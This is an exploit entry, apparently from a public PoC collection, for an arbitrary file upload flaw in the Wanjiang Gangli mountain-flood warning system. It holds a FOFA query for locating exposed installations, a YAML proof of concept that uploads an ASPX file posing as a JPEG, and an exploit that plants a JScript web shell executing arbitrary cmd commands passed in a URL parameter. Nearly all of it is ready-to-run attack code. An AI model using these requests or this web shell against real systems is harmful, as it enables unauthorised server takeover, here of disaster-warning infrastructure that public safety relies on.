# 成都万江港利科技有限公司 万江港利-山洪灾害预警系统 upload.aspx任意文件上传漏洞

    ## fofa

```
body="万江港利"&&body="山洪灾害"
```



## exp

```
detail:
  ID: 5004
  Author: Peanut
  Name: 万江港利-山洪灾害预警系统 任意文件上传漏洞
  Description: 万江港利山洪灾害防治预警系统软件是对空间信息技术、计算机网络技术、现代通信技术进行无缝集成，结合灾害监测预警的业务需求，采用世界领先GIS地理信息处理技术、RS遥感技术、GPRS/CMDA/3G通讯技术、Microsoft
    Silverlight Web前端应用程式开发解决方案、以及大容量数据采集技术和大容量数据存储等计算机网络通信与数据处理技术，建立一个用户界面友好的、多终端的、可定制的、集数据采集、存储、分析于一体的综合地理信息平台。成都万江港力科技有限公司-山洪灾害监测预警系统2.0存在严重的任意文件上传漏洞，可以未经授权获取服务器权限。
  Identifier:
    DVB: DVB-2023-5004
  VulnClass:
  - 任意文件上传
  Category:
  - 应用服务
  Manufacturer: '成都万江港利科技有限公司 '
  Product: 万江港利-山洪灾害预警系统
  Type: 1
  Status: 1
  Scanable: 1
  Level: 3
  DisclosureDate: '2022-05-25'
  Is0day: false
  IncludeExp: true
  Weakable: false
  IsXc: false
  IsCommon: false
  IsCallBack: false
  Condition: body="万江港利"&&body="山洪灾害"
  Solutions:
  - 请关注厂商的修复版本，并及时更新到最新版本.
poc:
  relative: req0 && req1
  session: true
  requests:
  - method: POST
    timeout: 10
    path: /App_Resource/UEditor/server/upload.aspx
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/57.0.927.108 Safari/537.36
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJa5U4zOAfmJDcYxj
    data: "------WebKitFormBoundaryJa5U4zOAfmJDcYxj\nContent-Disposition: form-data;\
      \ name=\"file\"; filename=\"1.aspx\"\nContent-Type: image/jpeg\n\n <%@Page Language=\"\
      C#\"%>\n <%\n Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"\
      ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));\n System.IO.File.Delete(Request.PhysicalPath);\n\
      \ %>\n------WebKitFormBoundaryJa5U4zOAfmJDcYxj--"
    follow_redirects: true
    matches: code.eq("200")
    set_variables:
    - str1: strSplit("{{body}}","Upload",1)
    - str2: strSplit("{{str1}}","aspx",0)
  - method: GET
    timeout: 10
    path: /Upload{{str2}}aspx
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36
        (KHTML, like Gecko) Chrome/91.0.3161.139 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("e165421110ba03099a1c0393373c5b43"))
exp:
  relative: req0 && req1
  session: true
  requests:
  - method: POST
    timeout: 10
    path: /App_Resource/UEditor/server/upload.aspx
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/57.0.927.108 Safari/537.36
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJa5U4zOAfmJDcYxj
    data: "------WebKitFormBoundaryJa5U4zOAfmJDcYxj\nContent-Disposition: form-data;\
      \ name=\"file\"; filename=\"1.aspx\"\nContent-Type: image/jpeg\n\n<%@ Page Language=\"\
      Jscript\" validateRequest=\"false\" %>\n<%\nvar c=new System.Diagnostics.ProcessStartInfo(\"\
      cmd\");\nvar e=new System.Diagnostics.Process();\nvar out:System.IO.StreamReader,EI:System.IO.StreamReader;\n\
      c.UseShellExecute=false;\nc.RedirectStandardOutput=true;\nc.RedirectStandardError=true;\n\
      e.StartInfo=c;\nc.Arguments=\"/c \" + Request.Item[\"cmd\"];\ne.Start();\nout=e.StandardOutput;\n\
      EI=e.StandardError;\ne.Close();\nResponse.Write(out.ReadToEnd() + EI.ReadToEnd());\n\
      System.IO.File.Delete(Request.PhysicalPath);\nResponse.End();\n%>\n------WebKitFormBoundaryJa5U4zOAfmJDcYxj--"
    follow_redirects: true
    matches: code.eq("200")
    set_variables:
    - str1: strSplit("{{body}}","Upload",1)
    - str2: strSplit("{{str1}}","aspx",0)
  - method: GET
    timeout: 10
    path: /Upload{{str2}}aspx?cmd={{command}}
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36
        (KHTML, like Gecko) Chrome/91.0.3161.139 Safari/537.36
    follow_redirects: true
    matches: code.eq("200")
    result: '{{body}}'
```
